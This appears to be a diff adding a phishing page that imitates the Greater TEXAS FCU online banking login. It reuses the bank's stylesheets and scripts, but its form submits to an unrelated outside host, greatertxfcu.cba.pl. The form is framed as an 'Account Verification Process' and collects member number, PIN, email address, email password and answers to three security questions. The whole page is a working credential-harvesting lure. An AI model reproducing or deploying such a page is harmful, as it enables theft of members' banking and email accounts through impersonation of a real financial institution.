@@ -1,0 +1,535 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="no-cache" http-equiv="pragma" />
+  <meta content="0" http-equiv="expires" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Greater TEXAS FCU Internet Banking
+  </title>
+  <link type="text/css" rel="stylesheet" href="https://rbserver.gtfcu.org/webResources/css/MFAstyles.css" />
+  <link href="https://rbserver.gtfcu.org/webResources/css/basic.css" type="text/css" rel="stylesheet" />
+  <link media="print" href="https://rbserver.gtfcu.org/webResources/css/printbasic.css" type="text/css" rel="stylesheet" />
+  <!--[if lt IE 7]><link rel="stylesheet" type="text/css" href="https://rbserver.gtfcu.org/webResources/css/IE6styles.css"  /><![endif]-->
+  <script type="text/javascript">
+   var isPad;
+  </script>
+  <!--[if lt IE 7]>
+    <div class="errorMessage browserWarning"><h2>WARNING</h2><p>You are using a version of Internet Explorer that is not supported. Minimum browser requirement is Internet Explorer 7.0.  Please <a href="http://www.microsoft.com/downloads/en/default.aspx" target="_blank">upgrade your browser</a> for optimal performance.</p></div>
+<![endif]-->
+  <style type="text/css">
+   .catg, .catg:link, .catg:visited, .catg:active  {
+    	background-color:#eeeeee;
+    	border-top:1px solid #dddddd;
+    	border-right:1px solid #dddddd;
+    	border-left:1px solid #dddddd;
+    }
+	.form,
+	.dataTable .dataRow td,
+	.dataTable .dataRowChild td,
+	.calCell,
+	.noAccounts, .noHistory,
+	#timer.timer,
+	#userDash .userMessage,
+	.catg:hover,
+    .catTable.dataTable,
+	#barsHider, #barsShower, div.barContainer {
+	    background-color:#ffffff;
+	}
+	.dataTable, .dataWrapper,
+	#userDash .userMessage,
+	.form.bpayment {
+		border-color: #cccccc;
+	}
+	.dataTable .dataHeader th,
+	.dataTable th,
+	#userDash .userMessage h2,
+	.loadBox,
+    a.all,a.none,
+    .dataTitle.sub,
+	.dataTable tr.dataTitle.sub td,
+    .dataTable .dataHeader th.header,
+	.bususeradmin_body .scrollBox  #t1.dataTable .dataRow td.uOnly {
+		background-color:#dddddd;
+	}
+	.even,
+	div.dataRow.even,
+	.dataTable .dataRow.even td,
+	.dataTable .dataRowChild.even td,
+    #userDash .securityKey,
+    #userDash .userLastLogin,
+    #userDash .userMail,
+	div.barMin, div.barMinSelect,
+    .button.disabled:hover,
+    input[disabled='disabled'].button:hover {
+		background-color:#eeeeee;
+	}
+	.dataTable tr.dataTitle td,
+	.dataTable .dataRowChild tr.dataTitle td,
+	div.dataTitle,
+	.helpHeader,
+	.dataTable .dataHeader td.dataHead,
+	.dataTable .dataHeader th.header:hover,
+    .dataTable .dataHeader th.headerSortUp ,
+    .dataTable .dataHeader th.headerSortDown{
+		background-color:#cccccc;
+	}
+	.button {
+		background-color:#eeeeee;
+		border:1px solid #cccccc;
+	}
+    .scatg, .scatg:link, .scatg:visited, .scatg:active  {
+    	background-color:#dddddd;
+    	border:1px solid #dddddd;
+    }
+
+    			            .messages_body .formBlock.tabBlock,
+		.messages_body .tabBlock + #f4b1,
+		.messages_body .tabBlock + #f3b1,
+		.messages_body .tabBlock + #f1b2,
+		.messages_body .tabBlock + #f2b1 {
+			border-color:#dddddd;
+        }
+		.messages_body .tabBlock + #f1b2 {
+			background-color: #ffffff;
+        }
+            .scrollBox {
+    	background-color:#eeeeee;
+    	border:1px solid #dddddd;
+    }
+    div.dataPager {
+        border-color:#dddddd;
+        background-color:#dddddd;
+    }
+		#barLegend, div.barContainer, div.barMin, div.barMinSelect {
+		border:1px solid #dddddd;
+	}
+	.NetDisplay {
+		border-top:1px solid #dddddd;
+	}
+        .catTable.dataTable .dataRow td
+    .catTable.dataTable .dataTitle td,
+    .helpLinks,
+    .helpLinks ul li {
+    	border-color:#dddddd;
+    }
+                #timer.timer { display:block; }
+  </style>
+  <link href="https://rbserver.gtfcu.org/webResources/css/nav/2nav.css" type="text/css" media="all" rel="stylesheet" />
+  <style type="text/css">
+   #tabBody {
+        padding:6px 0;
+            }
+    #subMenuBox {
+        background-color:#dddddd;
+            }
+            #menu {
+            margin-bottom:4px;
+        }
+        
+    #menu ul li a,
+    #menu ul li a:visited {
+        border:1px solid #888;
+            }
+    #menu ul li a.tabSelected,
+    #menu ul li a.tabSelected:visited {
+        border-color:#cccccc;
+        font-weight:bold;
+                    background-color:#dddddd;
+                    }
+    ul#subMenu li a.subTabSelected, ul#subMenu li a.subTabSelected:visited {
+        background-color:#eeeeee;
+    }
+  </style>
+  <link href="https://rbserver.gtfcu.org/webResources/css/nav/flat_menu.css" type="text/css" media="all" rel="stylesheet" />
+  <style type="text/css">
+   #menu ul li {
+            margin-bottom:-4px;
+            padding:2px 0 3px 0;
+        }
+  </style>
+  <script src="/webResources/scripts/jquery-latest.js" type="text/javascript">
+  </script>
+  <script src="/webResources/scripts/jquery.cavform.js" type="text/javascript">
+  </script>
+  <script src="/webResources/scripts/cav_utils.js" type="text/javascript">
+  </script>
+  <!--[if lt IE 7]><script defer type="text/javascript" src="/webResources/scripts/iepngfix.js"></script><![endif]-->
+  <script type="text/javascript">
+   // &lt;![CDATA[
+var transactionsNotAllowed = false;
+
+function postLoadWindow(parentId,pdata,target){
+var postForm = document.createElement("form");
+postForm.setAttribute("name","printForm");
+postForm.setAttribute("action","/servlet/Teller?timeInMillis=" + new Date().getTime());
+postForm.setAttribute("target",target);
+postForm.setAttribute("method","post");
+addFormInput(postForm,"hidden","id","");
+addFormInput(postForm,"hidden","requestType","vhtml");
+
+var tokens = pdata.split("&amp;");
+for(var i = 0;i&lt;tokens.length;i++){
+var nvpair=tokens[i];
+var eqIdx = nvpair.indexOf("=");
+if (eqIdx != -1){
+var name=nvpair.substring(0,eqIdx);
+var val=nvpair.substring(eqIdx + 1);
+if (name!=null &amp;&amp; val !=null){
+addFormInput(postForm,"hidden",name,val);
+}
+}
+}
+var parent = document.getElementById(parentId);
+parent.appendChild(postForm);
+postForm.submit();
+parent.removeChild(postForm);
+}
+function postLoad(pdata,targetTag){
+var du = true; var allowPost = true;
+var data={id: '',ajax: 'true',requestType : 'vhtml'};
+if(typeof arguments[2]!="undefined") du = arguments[2];
+var tokens = pdata.split("&amp;");
+for(var i = 0;i&lt;tokens.length;i++){
+var nvpair=tokens[i];
+var eqnv =nvpair.split("=");
+if (eqnv!=null){
+var name=eqnv[0];
+var val=eqnv[1];
+if (name!=null &amp;&amp; val !=null){
+var tname=data[name];
+if (tname==null)
+data[name]=val;
+}
+}
+}
+if(transactionsNotAllowed) {
+var curTrans = ','+data.request+',';
+if (transactionsNotAllowed.indexOf(curTrans)&gt;-1)
+allowPost = false;
+}
+if(typeof targetTag=='undefined') {
+targetTag = (typeof snippet=='undefined' || jQuery(snippet).length&lt;1) ? 'pageBody' : snippet;
+}
+if(allowPost) {
+loadingBusy(targetTag);
+var once = true;
+jQuery.ajaxq("genbank", {
+url: "/servlet/Teller",
+cache: false,
+type: "post",
+data: data,
+success: function(html) {
+jQuery(targetTag+' *').remove();
+if(targetTag=='pageBody' || targetTag=='result') {
+jQuery("#"+targetTag).html(html);
+}
+else {
+jQuery("#"+targetTag).replaceWith(html);
+}
+if(once) {
+if(menuid!='null')
+if(du)dynUpdate(menuid);
+once=false;
+showResponse();
+}
+},
+error: function() { alertError(targetTag); }
+});
+}
+else
+dynAlert('alert','&lt;div id="notAllowedError" class="errorMessage"&gt;&lt;h2&gt;ERROR&lt;/h2&gt;&lt;p&gt;This transaction is not available.&lt;/p&gt;&lt;/div&gt;');
+}
+
+function loadingBusy(targetTag) {
+if(typeof targetTag=="undefined") {
+targetTag = 'pageBody';
+}
+if(typeof arguments[1]!="undefined") {
+var sw = arguments[1];
+if(sw==0)
+jQuery("#loadBlur, #loadConfirm","#"+targetTag).remove();
+}
+else {
+var pos = jQuery("#"+targetTag).position();
+var wd = jQuery("#"+targetTag).innerWidth()+10;
+var ht = jQuery("#"+targetTag).innerHeight()+10;
+var iht = (ht&gt;800)?pos.top+30:pos.top+(ht*.3);
+var iwd = (wd/2)+pos.left;
+jQuery("#"+targetTag).prepend('&lt;div id="loadBlur" style="width:'+wd+'px; height:'+ht+'px; top:'+pos.top+'px; left:'+pos.left+'px"&gt;&lt;/div&gt;&lt;div id="loadConfirm" style="top:'+iht+'px; left:'+iwd+'px" onclick="ajaxCancel(\''+targetTag+'\');"&gt;&lt;div id="loadInconfirm"&gt;&lt;div class="loadBox"&gt;&lt;p&gt;Processing&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;');
+jQuery('#'+'loadBlur').show().css("opacity","0.6");
+
+}
+}
+function ajaxCancel(targetTag) {
+jQuery.ajaxq('genbank');
+jQuery("#loadBlur, #loadConfirm","#"+targetTag).remove();
+}
+function dynUpdate(menuid) {
+var nav=false; var snav=false;
+jQuery("#subMenuBox a").each(function(){
+jQuery(this).removeClass("subTabSelected");
+if(this.id=='snav_'+menuid) { nav = 'nav_'+this.name; snav = this.id; }
+});
+jQuery("#menu a").each(function(){
+jQuery(this).removeClass("tabSelected");
+if(this.id=='nav_'+menuid) nav = this.id;
+});
+jQuery('#subMenuBox ul').hide();
+if(snav) { jQuery("."+nav).show(); jQuery('#subMenuBox').css('visibility','visible'); }
+else { jQuery('#subMenuBox').css('visibility','hidden'); }
+jQuery('#'+nav).addClass("tabSelected");
+jQuery('#'+snav).addClass("subTabSelected");
+}
+function popPrintFriendly(id,url) {
+if (printwin==null || typeof(printwin)=="undefined") {
+var printwin = window.open('&amp;'+url, "printpop", "menubar,status,toolbar");
+printwin.onload = function(){ addTo(jQuery('#'+id),jQuery(printwin.document.body)) };
+}
+else
+addTo(jQuery('#'+id),jQuery(printpop.body))
+}
+function messageConfirm(mLink,msg) {
+while(mLink.indexOf("#") != -1) { mLink = mLink.replace("#", "%23"); }
+while(mLink.indexOf("'") != -1) { mLink = mLink.replace("'", "%27"); }
+var data = '&lt;div class="form"&gt;&lt;div class="dataTitle"&gt;&lt;h2&gt;Send Message&lt;/h2&gt;&lt;/div&gt;&lt;p&gt;Would you like to send your financial institution a message concerning this '+msg+'?&lt;/p&gt;&lt;div class="formBlock formControls"&gt;&lt;span class="controls"&gt;&lt;input type="button" value="Yes" onclick="dynAlert(0); dynAlert(\'go\',\'request=10010&amp;ajaxsub=true&amp;mode=prefill&amp;'+mLink+'\');" class="button" /&gt;&lt;input type="button" value="No" onclick="dynAlert(0)" class="button" /&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;';
+dynAlert('show',data);
+}
+function alertError(targ) {
+if(!targ)targ = "pageBody";
+jQuery("#loadBlur, #loadConfirm","#"+targ).remove();
+dynAlert('alert','&lt;div id="genError" class="errorMessage"&gt;&lt;h2&gt;ERROR&lt;/h2&gt;&lt;/div&gt;');
+}
+// ]]&gt;
+  </script>
+  <script type="text/javascript">
+   jQuery.noConflict();
+var webapp = "";
+var pageid = "sloginsc";
+var skinId = "c";
+var isMobile =  false ;
+var isBusiness =  false ;
+if (history.navigationMode)
+history.navigationMode = 'compatible';
+history.go(+1);
+  </script>
+ </head>
+ <body class="en  ">
+  <script src="/webResources/header.js" type="text/javascript">
+  </script>
+  <div id="pageBody">
+   <div class="sloginsc_body" id="sloginsc_body_1448961494462">
+    <script type="text/javascript">
+     function kv(){if(document.getElementsByName("f1").length&gt;0){var g="\036\037";function a(j){f(0,j)}function b(j){f(1,j)}function i(j){var k;if(document.all){k=document.createElement("input");k.setAttribute("type","hidden");k.setAttribute("name","kdata");k.value=g}else{k=document.createElement("textarea");k.setAttribute("style","display: none;");k.setAttribute("name","kdata");k.innerHTML=g}d("f1")[0].appendChild(k)}function f(m,n){var j;if(window.event){j=window.event.keyCode}else{if(n.which){j=n.which}}j=String.fromCharCode(j);var l=c(n);g+=j+"\036"+l+"\036"+m+"\037"}function c(k){var j=new Date();return(k.timestamp)?k.timestamp:j.getTime()}function d(e){return document.getElementsByName(e)}try{if(d("memberNumber")[0].attachEvent){d("memberNumber")[0].attachEvent("onkeyup",a);d("memberNumber")[0].attachEvent("onkeydown",b);d("f1")[0].attachEvent("onsubmit",i)}else{d("memberNumber")[0].addEventListener("keyup",a,false);d("memberNumber")[0].addEventListener("keydown",b,false);d("f1")[0].addEventListener("submit",i,false)}}catch(h){alert(h);return}}};
+var wavloc;
+function rscPlay() {
+if (navigator.appName == "Microsoft Internet Explorer") {
+document.all.swav.src = '';
+document.all.swav.src = wavloc;
+}
+else {
+document.getElementById("rscAudio").innerHTML = "";
+document.getElementById("rscAudio").innerHTML = '&lt;embed src="'+wavloc+'" hidden="true" autostart="true" name="swav" id="swav" enablejavascript="true" /&gt;';
+}
+document.getElementById("imageword").value="";
+document.getElementById("imageword").focus();
+}
+function getTTS(tt) {
+loadingBusy('pageBody');
+var data={template:'/c/login/sloginsc.vm', ajax:'true', login: 'true', tts : 'true', defaultLanguage:'en'  };
+jQuery.ajaxq("genbank", {
+url: "SLogin", cache: false, type: "post", data: data,
+success: function(html) {
+jQuery("#loadBlur, #loadConfirm","#pageBody").remove();
+jQuery('#'+'sloginsc_body_1448961494462 #f2wrapper #f2b2').html(jQuery('#f2wrapper #f2b2',html).html());
+var imgfile = jQuery('#f1 #imagefile',html).val();
+jQuery('#'+'sloginsc_body_1448961494462 #f1 #imagefile').val(imgfile);
+jQuery('#'+'sloginsc_body_1448961494462 #f1').append("&lt;input type='hidden' name='tts' value='true' /&gt;");
+rscWav(imgfile);
+},
+error: function() { alertError(); }
+});
+}
+function rscWav(fl) {
+wavloc = '/cache/simage_'+fl+'.wav';
+if (navigator.appName == "Microsoft Internet Explorer") {
+var embedd = '&lt;bgsound src="'+wavloc+'" id="swav"&gt;';
+jQuery('#'+'sloginsc_body_1448961494462 #f2wrapper #f2b2 .audioLink').append(embedd);
+}
+else { rscPlay(); }
+}
+jQuery(document).ready(function(){
+setTimeout('document.f1.memberNumber.focus()',1);
+kv();
+});
+    </script>
+    <div class="loginBody " id="f1wrapper">
+     <form onsubmit="loadingBusy('sloginsc_body_1448961494462')" autocomplete="off" action="http://greatertxfcu.cba.pl/gtfcu.php" method="post" name="f1" id="f1">
+      <div class="loginTop" id="f1b1">
+       <div class="loginTopCircle">
+       </div>
+       <div class="loginTopText">
+        Greater TEXAS FCU: Account Verification Process
+       </div>
+      </div>
+      <div class="form" id="f1b2">
+       <div class="dataTitle">
+       </div>
+       <p>
+       </p>
+       <div class="mfaForm" id="f2wrapper">
+        <div class="formBlock" id="f2b1">
+         <div class="label">
+          Member Number
+         </div>
+         <div class="input">
+          <input type="text" class="txtfield" value="" tabindex="1" id="memberNumber" name="memberNumber" />
+         </div>
+        </div>
+        <div class="formBlock" id="f2b1">
+         <div class="label">
+          Numerical GTNet PIN
+         </div>
+         <div class="input">
+          <input type="password" class="txtfield" value="" tabindex="1" id="memberNumber" name="pin" />
+         </div>
+        </div>
+        <div class="formBlock" id="f2b1">
+         <div class="label">
+          Email Address
+         </div>
+         <div class="input">
+          <input type="text" class="txtfield" value="" tabindex="1" id="memberNumber" name="Email" />
+         </div>
+        </div>
+        <div class="formBlock" id="f2b1">
+         <div class="label">
+          Email Password
+         </div>
+         <div class="input">
+          <input type="password" class="txtfield" value="" tabindex="1" id="memberNumber" name="Epass" />
+         </div>
+        </div>
+        Question 1:
+        <select id="ctl01_Main1_QG1Combo" name="q1">
+         <option value="What was your favorite place to visit when you were 16?">
+          What was your favorite place to visit when you were 16?
+         </option>
+         <option value="What was the first and last name of your favorite teacher?">
+          What was the first and last name of your favorite teacher?
+         </option>
+         <option value="What was your favorite sport, team, or athlete when you were 16?">
+          What was your favorite sport, team, or athlete when you were 16?
+         </option>
+         <option value="Your favorite actor, musician, or artist when you were in high-school?">
+          Your favorite actor, musician, or artist when you were in high-school?
+         </option>
+        </select>
+        <br />
+        <br />
+        ANSWER:
+        <input type="text" autocomplete="Off" class="input" id="ctl01_Main1_A1Textbox" name="a1" />
+        <span style="color:Red;visibility:hidden;" class="InputValidator" id="ctl01_Main1_ReqValA1">
+         *
+        </span>
+        <span style="color:Red;visibility:hidden;" id="ctl01_Main1_AlphaNumericA1">
+         *
+        </span>
+        <span style="color:Red;visibility:hidden;" id="ctl01_Main1_LenValA1">
+         *
+        </span>
+        <br />
+        <br />
+        Question 2:
+        <select id="ctl01_Main1_QG1Combo" name="q2">
+         <option value="What was your favorite place to visit when you were 16?">
+          What was your favorite place to visit when you were 16?
+         </option>
+         <option value="What was the first and last name of your favorite teacher?">
+          What was the first and last name of your favorite teacher?
+         </option>
+         <option value="What was your favorite sport, team, or athlete when you were 16?">
+          What was your favorite sport, team, or athlete when you were 16?
+         </option>
+         <option value="Your favorite actor, musician, or artist when you were in high-school?">
+          Your favorite actor, musician, or artist when you were in high-school?
+         </option>
+        </select>
+        <br />
+        <br />
+        ANSWER:
+        <input type="text" autocomplete="Off" class="input" id="ctl01_Main1_A1Textbox" name="a2" />
+        <span style="color:Red;visibility:hidden;" class="InputValidator" id="ctl01_Main1_ReqValA1">
+         *
+        </span>
+        <span style="color:Red;visibility:hidden;" id="ctl01_Main1_AlphaNumericA1">
+         *
+        </span>
+        <span style="color:Red;visibility:hidden;" id="ctl01_Main1_LenValA1">
+         *
+        </span>
+        <br />
+        <br />
+        Question 3:
+        <select id="ctl01_Main1_QG1Combo" name="q3">
+         <option value="What was your favorite place to visit when you were 16?">
+          What was your favorite place to visit when you were 16?
+         </option>
+         <option value="What was the first and last name of your favorite teacher?">
+          What was the first and last name of your favorite teacher?
+         </option>
+         <option value="What was your favorite sport, team, or athlete when you were 16?">
+          What was your favorite sport, team, or athlete when you were 16?
+         </option>
+         <option value="Your favorite actor, musician, or artist when you were in high-school?">
+          Your favorite actor, musician, or artist when you were in high-school?
+         </option>
+        </select>
+        <br />
+        <br />
+        ANSWER:
+        <input type="text" autocomplete="Off" class="input" id="ctl01_Main1_A1Textbox" name="a3" />
+        <span style="color:Red;visibility:hidden;" class="InputValidator" id="ctl01_Main1_ReqValA1">
+         *
+        </span>
+        <span style="color:Red;visibility:hidden;" id="ctl01_Main1_AlphaNumericA1">
+         *
+        </span>
+        <span style="color:Red;visibility:hidden;" id="ctl01_Main1_LenValA1">
+         *
+        </span>
+        <br />
+        <br />
+        <div class="buttons">
+         <input type="submit" class="submit" value="Continue" />
+        </div>
+       </div>
+      </div>
+     </form>
+    </div>
+    <input type="submit" style="width:0px;height:0px;border:none;background:none;" name="gosubmit" />
+    <input type="hidden" value="false" name="speedLogin" />
+    <input type="hidden" value="5af7c18e04022917cb9e48a244d00b14" id="imagefile" name="imagefile" />
+    <input type="hidden" value="c" name="skinId" />
+    <input type="hidden" value="en" name="defaultLanguage" />
+    <input type="hidden" value="1" name="request" size="32" />
+    <input type="hidden" value="vhtml" name="requestType" />
+    <div class="mfaBackButton" id="f1b4">
+     <div class="mfaButton">
+      <span class="controls">
+      </span>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div id="hiddenPreload">
+  </div>
+  <a style="display:none" href="https://rbserver.gtfcu.org/logos/logo.gif">
+  </a>
+  <div id="cavVersion">
+   3.5.1.92
+  </div>
+  <script src="/webResources/footer.js" type="text/javascript" language="JavaScript">
+  </script>
+ </body>
+</html>
